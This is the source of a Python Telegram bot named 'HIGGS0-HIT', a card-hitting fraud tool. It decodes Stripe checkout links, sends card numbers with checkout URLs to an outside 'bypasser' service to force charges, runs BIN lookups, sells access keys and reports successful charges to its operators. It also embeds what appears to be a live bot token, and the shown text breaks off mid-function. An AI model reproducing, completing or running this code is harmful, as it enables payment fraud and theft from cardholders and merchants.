#!/usr/bin/env python3
"""
HIGGS0-HIT v1.0 — Telegram Auto Card Hitter Bot
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Requirements: pip install python-telegram-bot aiohttp
Run:          python higgs0_hit_bot.py

Settings (log group ID etc.) are persisted in settings.json next to this file.
"""

import asyncio
import base64
import json
import os
import re
import secrets
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

import aiohttp
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ─── CONFIG ───────────────────────────────────────────────────────────────────

BOT_TOKEN  = "8892179337:AAGP0Jt9C_IwSAK5DBt0bQme81MjI_eVtx0"   # ← paste your bot token
ADMIN_ID   = "8233015284"

# ─── SETTINGS PERSISTENCE ─────────────────────────────────────────────────────

SETTINGS_FILE = Path(__file__).parent / "settings.json"

def load_settings() -> dict:
    try:
        if SETTINGS_FILE.exists():
            return json.loads(SETTINGS_FILE.read_text())
    except Exception:
        pass
    return {}

def save_settings(data: dict):
    try:
        SETTINGS_FILE.write_text(json.dumps(data, indent=2))
    except Exception as e:
        print(f"[WARN] Could not save settings: {e}")

_settings = load_settings()
_log_group_id:    str = _settings.get("log_group_id",    "")
_charge_group_id: str = _settings.get("charge_group_id", "")

def set_log_group(chat_id: str):
    global _log_group_id, _settings
    _log_group_id = chat_id
    _settings["log_group_id"] = chat_id
    save_settings(_settings)

def set_charge_group(chat_id: str):
    global _charge_group_id, _settings
    _charge_group_id = chat_id
    _settings["charge_group_id"] = chat_id
    save_settings(_settings)

# ─── CONSTANTS ────────────────────────────────────────────────────────────────

L = "━━━━━━━━━━━━━━━━━━━━━"
D = "◈"
A = "›"

STRIPE_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
}

# ─── IN-MEMORY STORAGE ────────────────────────────────────────────────────────

@dataclass
class User:
    telegram_id: str
    username: Optional[str] = None
    first_name: Optional[str] = None
    is_authorized: bool = False
    is_banned: bool = False
    authorized_at: Optional[float] = None
    created_at: float = field(default_factory=time.time)

@dataclass
class Key:
    key: str
    is_used: bool = False
    assigned_to: Optional[str] = None
    used_at: Optional[float] = None
    expires_at: Optional[float] = None
    created_at: float = field(default_factory=time.time)

@dataclass
class CheckoutSession:
    pk: str
    cs: str
    init_data: dict
    merchant: Optional[str]
    price: Optional[float]
    currency: Optional[str]
    email: Optional[str]
    url: str
    success_url: Optional[str]
    support_url: Optional[str]

@dataclass
class BulkStats:
    charged: int = 0
    declined: int = 0
    tds: int = 0
    failed: int = 0
    total: int = 0

users: dict[str, User] = {}
keys: dict[str, Key] = {}
user_sessions: dict[str, CheckoutSession] = {}
bulk_mode_users: set[str] = set()
bulk_stats: dict[str, BulkStats] = {}

# ─── HELPERS ──────────────────────────────────────────────────────────────────

def is_admin(uid) -> bool:
    return str(uid) == ADMIN_ID

def generate_key() -> str:
    return "HGS-" + secrets.token_hex(10).upper()

def status_badge(u: User) -> str:
    if u.is_banned:      return "🔴 <b>BANNED</b>"
    if u.is_authorized:  return "🟢 <b>AUTHORIZED</b>"
    return "🟡 <b>PENDING</b>"

def status_emoji(status: str) -> str:
    if status == "CHARGED":  return "✅"
    if status == "DECLINED": return "❌"
    if status == "3DS":      return "🔐"
    return "⚠️"

def is_checkout_dead(response: str) -> bool:
    r = response.lower()
    return any(x in r for x in [
        "already been processed", "already been paid", "already been completed",
        "already paid", "has been paid", "session has expired",
        "checkout session has", "link has already", "no such checkout",
        "payment link", "expired", "already complete",
    ])

def _site_line(session: CheckoutSession) -> str:
    name = session.merchant or "N/A"
    if session.support_url:
        try:
            domain = urlparse(session.support_url).hostname or session.support_url
            domain = domain.lstrip("www.")
            return f"{name} ({domain})"
        except Exception:
            return f"{name} ({session.support_url})"
    return name

def fmt_result(res: dict, session: Optional[CheckoutSession] = None) -> str:
    if res["status"] == "CHARGED" and session:
        amount = f"{session.price} {session.currency or ''}".strip() if session.price is not None else res["response"]
        site   = _site_line(session)
        confirm = session.success_url or "N/A"
        return (
            f"<b>CC:</b> <code>{res['card']}</code>\n"
            f"<b>Status: Paid ✅</b>\n"
            f"<b>Message: {amount} Charged!</b>\n\n"
            f"<b>Site:</b> {site}\n"
            f"<b>ConfirmUrl:</b> {confirm}\n"
            f"<b>Amount:</b> {amount}\n\n"
            f"<i>(Note: Some sites require payment confirmation via the confirm URL.)</i>\n\n"
            f"{L}\n"
            f"<b>Gateway:</b> Stripe Co (Beta)\n"
            f"<b>Dev:</b> Zangi"
        )
    em = status_emoji(res["status"])
    return (
        f"<b>CC:</b> <code>{res['card']}</code>\n"
        f"<b>Status:</b> {em} <b>{res['status']}</b>\n"
        f"<b>Message:</b> <code>{res['response']}</code>"
    )

def ensure_user(uid: int, username: str = None, first_name: str = None):
    tid = str(uid)
    if tid not in users:
        users[tid] = User(telegram_id=tid, username=username, first_name=first_name)

async def is_authorized(uid) -> bool:
    if is_admin(uid): return True
    u = users.get(str(uid))
    return u is not None and u.is_authorized and not u.is_banned

def denied_msg() -> str:
    return f"{L}\n<b>⛔ ACCESS DENIED</b>\n{L}"

# ─── HITTER LOGIC ─────────────────────────────────────────────────────────────

def extract_checkout_url(text: str) -> Optional[str]:
    # Match Stripe-hosted checkouts and custom-domain Stripe checkouts.
    # The path must contain /c/pay/cs_ or /pay/cs_ followed by the session id.
    patterns = [
        r"https?://[^/\s]+/c/pay/cs_[^\s\"'<>)]+",
        r"https?://[^/\s]+/pay/cs_[^\s\"'<>)]+",
        r"https?://checkout\.stripe\.com/c/pay/cs_[^\s\"'<>)]+",
        r"https?://buy\.stripe\.com/[^\s\"'<>)]+",
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(0).rstrip(".,;:")
    return None

def decode_pk_from_url(url: str) -> tuple[Optional[str], Optional[str]]:
    pk, cs = None, None
    cs_m = re.search(r"cs_(live|test)_[A-Za-z0-9_-]+", url)
    if cs_m:
        cs = cs_m.group(0)
    # Try legacy XOR fragment first
    if "#" in url:
        try:
            frag = url.split("#")[1]
            # Stripe's new fragment is URL-encoded base64; decode it first
            from urllib.parse import unquote
            frag = unquote(frag)
            buf = base64.b64decode(frag + "==")
            xored = "".join(chr(b ^ 5) for b in buf)
            pk_m = re.search(r"pk_(live|test)_[A-Za-z0-9]+", xored)
            if pk_m:
                pk = pk_m.group(0)
        except Exception:
            pass
    return pk, cs

def parse_card(text: str) -> Optional[dict]:
    parts = re.split(r"[|:/\\\-\s]+", text.strip())
    if len(parts) < 4:
        return None
    cc = re.sub(r"\D", "", parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip().zfill(2)
    if len(month) != 2 or not month.isdigit() or not (1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r"\D", "", parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

async def lookup_bin(bin_num: str) -> dict:
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as s:
            async with s.get(f"https://bins.antipublic.cc/bins/{bin_num[:8]}") as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    return {
                        "bin": bin_num[:6],
                        "brand":   d.get("brand",        "N/A"),
                        "type":    d.get("type",         "N/A"),
                        "level":   d.get("level",        "N/A"),
                        "bank":    d.get("bank",         "N/A"),
                        "country": d.get("country_name", "N/A"),
                        "flag":    d.get("country_flag", ""),
                    }
    except Exception:
        pass
    return {"bin": bin_num[:6], "brand": "N/A", "type": "N/A",
            "level": "N/A", "bank": "N/A", "country": "N/A", "flag": ""}

async def init_checkout(raw_url: str):
    url = extract_checkout_url(raw_url) or raw_url
    pk, cs = decode_pk_from_url(url)
    if not cs:
        return {"error": "Could not decode CS from URL"}
    body = f"key={pk or 'pk_live_unknown'}&eid=NA&browser_locale=en-US&redirect_type=url"
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as s:
            async with s.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/init",
                headers=STRIPE_HEADERS, data=body
            ) as r:
                init_data = await r.json(content_type=None)
        if "error" in init_data:
            return {"error": init_data["error"].get("message", "Init failed")}
        # Fallback: if URL fragment decode failed, grab PK from init response body.
        if not pk:
            pk_m = re.search(r"pk_(live|test)_[A-Za-z0-9]+", json.dumps(init_data))
            if pk_m:
                pk = pk_m.group(0)
            else:
                return {"error": "Could not decode PK from URL or init response"}
        acc         = init_data.get("account_settings") or {}
        merchant    = acc.get("display_name") or acc.get("business_name")
        support_url = acc.get("support_url")
        success_url = (
            init_data.get("return_url") or
            init_data.get("success_url") or
            (init_data.get("payment_intent") or {}).get("return_url") or
            (init_data.get("subscription") or {}).get("return_url") or
            (init_data.get("setup_intent") or {}).get("return_url")
        )
        email = (
            init_data.get("customer_email") or
            (init_data.get("customer") or {}).get("email")
        )
        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        price = currency = None
        if lig:
            price    = (lig.get("total") or 0) / 100
            currency = (lig.get("currency") or "").upper()
        elif inv:
            price    = (inv.get("total") or 0) / 100
            currency = (inv.get("currency") or "").upper()
        return CheckoutSession(
            pk=pk, cs=cs, init_data=init_data,
            merchant=merchant, price=price, currency=currency,
            email=email, url=url,
            success_url=success_url, support_url=support_url
        )
    except Exception as e:
        return {"error": str(e)[:100]}

async def charge_card(cc_str: str, session: CheckoutSession) -> dict:
    start = time.time()
    card = parse_card(cc_str)
    if not card:
        return {"card": cc_str, "status": "INVALID", "response": "Invalid card format", "time": 0}

    card_str = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
    result = {"card": card_str, "status": "FAILED", "response": "Unknown error", "time": 0}

    try:
        api_res = await call_ravenxkiller(card_str, session.url)
        status = (api_res.get("status") or "").lower()
        message = api_res.get("message") or "No message"

        if status in ("success", "charged", "approved", "live"):
            result.update(status="CHARGED", response=message)
        elif status in ("dead", "error", "declined", "failed"):
            result.update(status="DECLINED", response=message)
        else:
            result.update(status="UNKNOWN", response=f"{status}: {message}")
    except Exception as e:
        result.update(status="ERROR", response=str(e)[:80])

    result["time"] = round(time.time() - start, 1)
    return result

# ─── RAVENXKILLER API ──────────────────────────────────────────────────────────

RAVENXKILLER_URL = "https://ravenxkiller.site/Bypasser/bot.php"

async def call_ravenxkiller(cc: str, checkout_url: str) -> dict:
    """Call the ravenxkiller bypasser API with a card and checkout URL."""
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
        data = {"cc": cc, "checkout": checkout_url}
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        async with s.post(RAVENXKILLER_URL, data=data, headers=headers) as r:
            return await r.json(content_type=None)


# ─── GROUP LOG ────────────────────────────────────────────────────────────────

async def send_group_log(app, triggered_by: dict, res: dict, session: CheckoutSession):
    if not _log_group_id:
        return
    amount = f"{session.price} {session.currency or ''}".strip() if session.price is not None else "N/A"
    msg = (
        f"𝐒𝐭𝐚𝐭𝐮𝐬: 𝐏𝐚𝐢𝐝 ✅\n"
        f"𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {amount} 𝐂𝐡𝐚𝐫𝐠𝐞𝐝\n"
        f"𝐒𝐢𝐭𝐞: {_site_line(session)}\n"
        f"𝐔𝐬𝐞𝐫: @{triggered_by.get('username') or 'unknown'}"
    )
    try:
        await app.bot.send_message(chat_id=_log_group_id, text=msg)
    except Exception as e:
        print(f"[WARN] Group log failed: {e}")

# ─── ADMIN CHARGE ALERT ───────────────────────────────────────────────────────

async def send_charge_alert(app, triggered_by: dict, charged_card: str,
                            tried_cards: list, session: CheckoutSession):
    amount   = f"{session.price} {session.currency or ''}".strip() if session.price is not None else "N/A"
    tried_list = "\n".join(
        f"  {'✅' if t['status'] == 'CHARGED' else '🔐' if t['status'] == '3DS' else '❌'} <code>{t['card']}</code>"
        for t in tried_cards
    )
    msg = (
        f"{L}\n<b>🔔 CHARGE ALERT</b>\n{L}\n\n"
        f"{D} <b>MERCHANT</b> :: {_site_line(session)}\n"
        f"{D} <b>AMOUNT</b>   :: <code>{amount}</code>\n"
        f"{D} <b>USER</b>     :: <code>@{triggered_by.get('username') or 'N/A'}</code>"
        f" (<code>{triggered_by['id']}</code>)\n\n"
        f"<b>✅ CHARGED CARD:</b>\n  <code>{charged_card}</code>\n\n"
        f"<b>📋 ALL TRIED [{len(tried_cards)}]:</b>\n{tried_list}\n\n"
        f"{L}\n<b>Gateway:</b> Stripe Co (Beta)\n<b>Dev:</b> Zangi"
    )
    try:
        await app.bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode=ParseMode.HTML)
    except Exception as e:
        print(f"[WARN] Admin alert failed: {e}")
    if _charge_group_id:
        try:
            await app.bot.send_message(chat_id=_charge_group_id, text=msg, parse_mode=ParseMode.HTML)
        except Exception as e:
            print(f"[WARN] Charge group alert failed: {e}")

# ─── COMMAND HANDLERS ─────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    f = update.effective_user
    ensure_user(f.id, f.username, f.first_name)
    await update.message.reply_text(
        f"{L}\n<b>  ⚡ HIGGS0-HIT  //  BOT v1.0</b>\n{L}\n\n"
        f"{D} <b>DEV</b>     :: <code>HIGGS0</code>\n"
        f"{D} <b>YOUR ID</b> :: <code>{f.id}</code>\n\n"
        f"<i>Type /help to see all commands.</i>\n"
        f"<i>Use /usekey [KEY] to activate access.</i>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    admin = is_admin(update.effective_user.id)
    msg = (
        f"{L}\n<b>  📋 COMMAND MANUAL</b>\n{L}\n\n"
        f"<b>[ USER ]</b>\n"
        f"<code>/start</code>          {A} Register &amp; greet\n"
        f"<code>/status</code>         {A} Your auth status\n"
        f"<code>/id</code>             {A} Your Telegram ID\n"
        f"<code>/usekey [KEY]</code>   {A} Redeem access key\n\n"
        f"<b>[ HITTER ]</b>\n"
        f"<code>/hit [url]</code>       {A} Load checkout URL\n"
        f"<code>/chk [card]</code>      {A} Check single card\n"
        f"<code>/mhit [url]</code>      {A} Bulk mode (send cards)\n"
        f"<code>/stop</code>            {A} Stop bulk mode\n"
        f"<code>/bin [number]</code>    {A} BIN lookup\n"
    )
    if admin:
        msg += (
            f"\n<b>[ ADMIN ]</b>\n"
            f"<code>/users</code>              {A} List all users\n"
            f"<code>/auth [id]</code>          {A} Authorize user\n"
            f"<code>/deauth [id]</code>        {A} Deauthorize user\n"
            f"<code>/ban [id]</code>           {A} Ban user\n"
            f"<code>/unban [id]</code>         {A} Unban user\n"
            f"<code>/info [id]</code>          {A} User profile\n"
            f"<code>/genkey [days]</code>           {A} Generate 1 key (optional expiry)\n"
            f"<code>/genkeys [n] [days]</code>    {A} Generate n keys, optional expiry\n"
            f"<code>/keys</code>               {A} List all keys\n"
            f"<code>/delkey [KEY]</code>       {A} Delete a key\n"
            f"<code>/stats</code>              {A} Bot statistics\n"
            f"<code>/broadcast [msg]</code>    {A} Message all users\n"
            f"<code>/setloggroup</code>        {A} Set this chat as simple log group\n"
            f"<code>/setchargegroup</code>     {A} Set this chat for full charge alerts\n"
            f"<code>/testlog</code>            {A} Test the simple log group\n"
            f"<code>/testcharge</code>         {A} Test the charge alert group\n"
        )
    msg += f"\n{L}"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def cmd_id(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    f = update.effective_user
    await update.message.reply_text(
        f"{L}\n<b>  🆔 YOUR IDENTITY</b>\n{L}\n\n"
        f"{D} <b>ID</b>       :: <code>{f.id}</code>\n"
        f"{D} <b>USERNAME</b> :: <code>@{f.username or 'N/A'}</code>\n"
        f"{D} <b>NAME</b>     :: <code>{f.first_name or 'N/A'}</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    f = update.effective_user
    ensure_user(f.id, f.username, f.first_name)
    u      = users[str(f.id)]
    joined = time.strftime("%Y-%m-%d", time.localtime(u.created_at))
    await update.message.reply_text(
        f"{L}\n<b>  📡 ACCOUNT STATUS</b>\n{L}\n\n"
        f"{D} <b>ID</b>       :: <code>{f.id}</code>\n"
        f"{D} <b>USERNAME</b> :: <code>@{u.username or 'N/A'}</code>\n"
        f"{D} <b>STATUS</b>   :: {status_badge(u)}\n"
        f"{D} <b>JOINED</b>   :: <code>{joined}</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_usekey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    f = update.effective_user
    ensure_user(f.id, f.username, f.first_name)
    key_arg = " ".join(ctx.args or "").strip().upper()
    if not key_arg:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b> <code>/usekey HGS-XXXXXXXXXXXXXXXXXXXX</code>",
            parse_mode=ParseMode.HTML); return
    k = keys.get(key_arg)
    if not k:
        await update.message.reply_text(
            f"{L}\n<b>❌ INVALID KEY</b>\n{L}\n<code>KEY :: NOT FOUND</code>",
            parse_mode=ParseMode.HTML); return
    if k.is_used:
        await update.message.reply_text(
            f"{L}\n<b>❌ KEY EXHAUSTED</b>\n{L}\n<code>KEY :: ALREADY REDEEMED</code>",
            parse_mode=ParseMode.HTML); return
    if k.expires_at and k.expires_at < time.time():
        exp_date = time.strftime("%Y-%m-%d", time.localtime(k.expires_at))
        await update.message.reply_text(
            f"{L}\n<b>❌ KEY EXPIRED</b>\n{L}\n<code>KEY :: EXPIRED {exp_date}</code>",
            parse_mode=ParseMode.HTML); return
    tid = str(f.id)
    k.is_used = True; k.assigned_to = tid; k.used_at = time.time()
    users[tid].is_authorized = True; users[tid].authorized_at = time.time()
    await update.message.reply_text(
        f"{L}\n<b>  ✅ ACCESS GRANTED</b>\n{L}\n\n"
        f"{D} <b>KEY</b>    :: <code>{key_arg}</code>\n"
        f"{D} <b>STATUS</b> :: 🟢 <b>AUTHORIZED</b>\n\n"
        f"<i>Welcome aboard.</i>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

# ─── ADMIN COMMANDS ───────────────────────────────────────────────────────────

async def cmd_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    target = " ".join(ctx.args or "").strip()
    if not target:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/auth [user_id]</code>", parse_mode=ParseMode.HTML); return
    u = users.get(target)
    if not u:
        await update.message.reply_text(f"{L}\n<b>❌ USER NOT FOUND</b>\n{L}\n<code>{target}</code>", parse_mode=ParseMode.HTML); return
    u.is_authorized = True; u.authorized_at = time.time()
    await update.message.reply_text(
        f"{L}\n<b>  ✅ USER AUTHORIZED</b>\n{L}\n\n"
        f"{D} <b>ID</b>       :: <code>{target}</code>\n"
        f"{D} <b>USERNAME</b> :: <code>@{u.username or 'N/A'}</code>\n"
        f"{D} <b>STATUS</b>   :: 🟢 <b>AUTHORIZED</b>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_deauth(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    target = " ".join(ctx.args or "").strip()
    if not target:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/deauth [user_id]</code>", parse_mode=ParseMode.HTML); return
    u = users.get(target)
    if not u:
        await update.message.reply_text(f"{L}\n<b>❌ USER NOT FOUND</b>\n{L}", parse_mode=ParseMode.HTML); return
    u.is_authorized = False
    await update.message.reply_text(
        f"{L}\n<b>  🔒 USER DEAUTHORIZED</b>\n{L}\n\n"
        f"{D} <b>ID</b>       :: <code>{target}</code>\n"
        f"{D} <b>USERNAME</b> :: <code>@{u.username or 'N/A'}</code>\n"
        f"{D} <b>STATUS</b>   :: 🟡 <b>PENDING</b>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_ban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    target = " ".join(ctx.args or "").strip()
    if not target:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/ban [user_id]</code>", parse_mode=ParseMode.HTML); return
    u = users.get(target)
    if not u:
        await update.message.reply_text(f"{L}\n<b>❌ USER NOT FOUND</b>\n{L}", parse_mode=ParseMode.HTML); return
    u.is_banned = True; u.is_authorized = False
    await update.message.reply_text(
        f"{L}\n<b>  🔨 USER BANNED</b>\n{L}\n\n"
        f"{D} <b>ID</b>       :: <code>{target}</code>\n"
        f"{D} <b>USERNAME</b> :: <code>@{u.username or 'N/A'}</code>\n"
        f"{D} <b>STATUS</b>   :: 🔴 <b>BANNED</b>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_unban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    target = " ".join(ctx.args or "").strip()
    if not target:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/unban [user_id]</code>", parse_mode=ParseMode.HTML); return
    u = users.get(target)
    if u: u.is_banned = False
    await update.message.reply_text(
        f"{L}\n<b>  ✅ USER UNBANNED</b>\n{L}\n\n{D} <b>ID</b> :: <code>{target}</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    args = ctx.args or []
    try:
        days = int(args[0]) if args else None
    except ValueError:
        days = None
    expires_at = (time.time() + days * 86400) if days else None
    k = generate_key()
    keys[k] = Key(key=k, expires_at=expires_at)
    expiry_line = ""
    if expires_at:
        exp_date = time.strftime("%Y-%m-%d", time.localtime(expires_at))
        expiry_line = f"{D} <b>EXPIRES</b> :: <code>{exp_date}</code> ({days}d)\n"
    await update.message.reply_text(
        f"{L}\n<b>  🔑 KEY GENERATED</b>\n{L}\n\n"
        f"{D} <b>KEY</b>    :: <code>{k}</code>\n"
        f"{expiry_line}"
        f"{D} <b>STATUS</b> :: 🟢 <b>ACTIVE</b>\n\n"
        f"<i>Share this key to grant access.</i>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_genkeys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    args = ctx.args or []
    try:
        n = min(int(args[0]), 20) if args else 5
    except ValueError:
        n = 5
    try:
        days = int(args[1]) if len(args) > 1 else None
    except ValueError:
        days = None
    expires_at = (time.time() + days * 86400) if days else None
    new_keys = []
    for _ in range(n):
        k = generate_key()
        keys[k] = Key(key=k, expires_at=expires_at)
        new_keys.append(k)
    lines = "\n".join(f"<code>{str(i+1).zfill(2)}. {k}</code>" for i, k in enumerate(new_keys))
    expiry_note = ""
    if expires_at:
        exp_date = time.strftime("%Y-%m-%d", time.localtime(expires_at))
        expiry_note = f"\n{D} <b>EXPIRES</b> :: <code>{exp_date}</code> ({days}d each)\n"
    await update.message.reply_text(
        f"{L}\n<b>  🔑 {n} KEYS GENERATED</b>\n{L}\n{expiry_note}\n{lines}\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_keys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    all_keys = sorted(keys.values(), key=lambda k: k.created_at, reverse=True)[:30]
    if not all_keys:
        await update.message.reply_text(f"{L}\n<b>🔑 NO KEYS FOUND</b>\n{L}", parse_mode=ParseMode.HTML); return
    now     = time.time()
    active  = [k for k in all_keys if not k.is_used and (not k.expires_at or k.expires_at > now)]
    expired = [k for k in all_keys if not k.is_used and k.expires_at and k.expires_at <= now]
    used    = [k for k in all_keys if k.is_used]
    msg = f"{L}\n<b>  🔑 KEY REGISTRY  [ {len(all_keys)} TOTAL ]</b>\n{L}\n\n"
    msg += f"<b>🟢 ACTIVE [ {len(active)} ]</b>\n"
    for k in active[:15]:
        exp = f" ⏳ <code>{time.strftime('%Y-%m-%d', time.localtime(k.expires_at))}</code>" if k.expires_at else ""
        msg += f"{A} <code>{k.key}</code>{exp}\n"
    if expired:
        msg += f"\n<b>🕛 EXPIRED [ {len(expired)} ]</b>\n"
        for k in expired[:5]:
            msg += f"{A} <code>{k.key}</code> ⏳ <code>{time.strftime('%Y-%m-%d', time.localtime(k.expires_at))}</code>\n"
    msg += f"\n<b>⬛ USED [ {len(used)} ]</b>\n"
    for k in used[:10]: msg += f"{A} <code>{k.key}</code> {A} <code>{k.assigned_to or '?'}</code>\n"
    msg += f"\n{L}"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def cmd_delkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    key_arg = " ".join(ctx.args or "").strip().upper()
    if not key_arg:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/delkey HGS-XXXX</code>", parse_mode=ParseMode.HTML); return
    keys.pop(key_arg, None)
    await update.message.reply_text(
        f"{L}\n<b>  🗑 KEY DELETED</b>\n{L}\n\n{D} <code>{key_arg}</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    all_users = sorted(users.values(), key=lambda u: u.created_at, reverse=True)[:50]
    if not all_users:
        await update.message.reply_text(f"{L}\n<b>👤 NO USERS YET</b>\n{L}", parse_mode=ParseMode.HTML); return
    authed  = [u for u in all_users if u.is_authorized and not u.is_banned]
    pending = [u for u in all_users if not u.is_authorized and not u.is_banned]
    banned  = [u for u in all_users if u.is_banned]
    msg = f"{L}\n<b>  👥 USER REGISTRY  [ {len(all_users)} TOTAL ]</b>\n{L}\n\n"
    msg += f"<b>🟢 AUTHORIZED [ {len(authed)} ]</b>\n"
    for u in authed:  msg += f"{A} <code>{u.telegram_id}</code> :: <code>@{u.username or 'N/A'}</code>\n"
    msg += f"\n<b>🟡 PENDING [ {len(pending)} ]</b>\n"
    for u in pending: msg += f"{A} <code>{u.telegram_id}</code> :: <code>@{u.username or 'N/A'}</code>\n"
    if banned:
        msg += f"\n<b>🔴 BANNED [ {len(banned)} ]</b>\n"
        for u in banned: msg += f"{A} <code>{u.telegram_id}</code> :: <code>@{u.username or 'N/A'}</code>\n"
    msg += f"\n{L}"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def cmd_info(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    target = " ".join(ctx.args or "").strip()
    if not target:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/info [user_id]</code>", parse_mode=ParseMode.HTML); return
    u = users.get(target)
    if not u:
        await update.message.reply_text(f"{L}\n<b>❌ USER NOT FOUND</b>\n{L}", parse_mode=ParseMode.HTML); return
    joined  = time.strftime("%Y-%m-%d", time.localtime(u.created_at))
    auth_at = time.strftime("%Y-%m-%d", time.localtime(u.authorized_at)) if u.authorized_at else "N/A"
    key_cnt = sum(1 for k in keys.values() if k.assigned_to == target)
    await update.message.reply_text(
        f"{L}\n<b>  🔍 USER PROFILE</b>\n{L}\n\n"
        f"{D} <b>ID</b>        :: <code>{u.telegram_id}</code>\n"
        f"{D} <b>USERNAME</b>  :: <code>@{u.username or 'N/A'}</code>\n"
        f"{D} <b>NAME</b>      :: <code>{u.first_name or 'N/A'}</code>\n"
        f"{D} <b>STATUS</b>    :: {status_badge(u)}\n"
        f"{D} <b>JOINED</b>    :: <code>{joined}</code>\n"
        f"{D} <b>AUTH DATE</b> :: <code>{auth_at}</code>\n"
        f"{D} <b>KEYS USED</b> :: <code>{key_cnt}</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    all_u   = list(users.values()); all_k = list(keys.values())
    authed  = sum(1 for u in all_u if u.is_authorized and not u.is_banned)
    banned  = sum(1 for u in all_u if u.is_banned)
    used_k  = sum(1 for k in all_k if k.is_used)
    uptime  = int(time.time() - _start_time)
    await update.message.reply_text(
        f"{L}\n<b>  📊 BOT STATISTICS</b>\n{L}\n\n"
        f"<b>[ USERS ]</b>\n"
